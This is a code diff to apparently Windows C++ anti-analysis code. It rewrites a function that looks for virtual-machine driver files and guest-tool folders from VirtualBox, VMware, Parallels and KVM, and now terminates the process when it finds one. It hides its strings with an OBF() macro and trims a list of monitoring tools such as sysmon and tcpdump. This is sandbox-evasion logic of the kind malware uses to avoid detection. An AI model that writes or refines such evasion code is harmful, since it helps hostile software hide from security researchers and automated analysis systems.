@@ -86,44 +86,43 @@ BOOL DirectoryExists(const std::wstring& dirPath) {
 }
 
 BOOL VMArtifactsDetect() {
+	std::wstring systemRoot(MAX_PATH, L'\0');
+    if (!GetEnvironmentVariableW(OBF(L"SystemRoot"), &systemRoot[0], MAX_PATH)) {
+        return FALSE;
+    }
+    systemRoot.resize(wcslen(systemRoot.c_str()));
     std::vector<std::wstring> badFileNames = {
-        OBF(L"vboxmouse.sys"),
-        OBF(L"vboxguest.sys"),
-        OBF(L"vboxsf.sys"),
-        OBF(L"vboxvideo.sys"),
-        OBF(L"vmmouse.sys"),
-        OBF(L"vboxogl.dll")
+        OBF(L"\\drivers\\vmmouse.sys"),
+        OBF(L"\\drivers\\vmhgfs.sys"),
+        OBF(L"\\drivers\\VBoxMouse.sys"),
+        OBF(L"\\drivers\\VBoxGuest.sys"),
+        OBF(L"\\drivers\\VBoxSF.sys"),
+        OBF(L"\\drivers\\VBoxVideo.sys"),
+        OBF(L"\\drivers\\prlfs.sys"),
+		OBF(L"\\drivers\\balloon.sys"),
+		OBF(L"\\drivers\\netkvm.sys"),
+		OBF(L"\\drivers\\viofs.sys"),
+        OBF(L"\\vboxdisp.dll"),
+        OBF(L"\\vboxhook.dll"),
+        OBF(L"\\vboxmrxnp.dll"),
+        OBF(L"\\vboxogl.dll"),
+        OBF(L"\\vboxoglarrayspu.dll"),
+        OBF(L"\\vboxoglcrutil.dll"),
+        OBF(L"\\vboxoglerrorspu.dll"),
+        OBF(L"\\vboxoglfeedbackspu.dll")
     };
     std::vector<std::wstring> badDirs = {
         OBF(L"C:\\Program Files\\VMware"),
-        OBF(L"C:\\Program Files\\oracle\\virtualbox guest additions")
+        OBF(L"C:\\Program Files\\Oracle\\VirtualBox Guest Additions")
     };
-    DWORD bufferSize = GetEnvironmentVariableW(OBF(L"SystemRoot"), NULL, 0);
-    if (bufferSize == 0) {
-        return FALSE; 
-    }
-    std::wstring systemRoot(bufferSize, L'\0');
-    if (GetEnvironmentVariableW(OBF(L"SystemRoot"), &systemRoot[0], bufferSize) == 0) {
-        return FALSE; 
-    }
-    systemRoot.resize(bufferSize - 1);
-    std::wstring system32Folder = systemRoot + OBF(L"\\System32\\*");
-    WIN32_FIND_DATAW findFileData;
-    HANDLE hFind = FindFirstFileW(system32Folder.c_str(), &findFileData);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            std::wstring fileName = findFileData.cFileName;
-            std::transform(fileName.begin(), fileName.end(), fileName.begin(), ::towlower);
-            if (std::find(badFileNames.begin(), badFileNames.end(), fileName) != badFileNames.end()) {
-                FindClose(hFind);
-                return TRUE;
-            }
-        } while (FindNextFileW(hFind, &findFileData) != 0);
-        FindClose(hFind);
+    for (const auto& badFileName : badFileNames) {
+        if (FileExists(systemRoot + OBF(L"\\System32") + badFileName)) {
+            ExitProcess(1);
+        }
     }
     for (const auto& badDir : badDirs) {
         if (DirectoryExists(badDir)) {
-            return TRUE;
+            ExitProcess(1);
         }
     }
     return FALSE;
@@ -142,7 +141,6 @@ BOOL VMPROTECT() {
         OBF(L"qemu-ga"),
         OBF(L"sandman.exe"),
         OBF(L"sysmon.exe"),
-        OBF(L"taskmgr.exe"),
         OBF(L"tcpdump.exe"),
         OBF(L"sniff_hit.exe"),
         OBF(L"vboxcontrol.exe"),
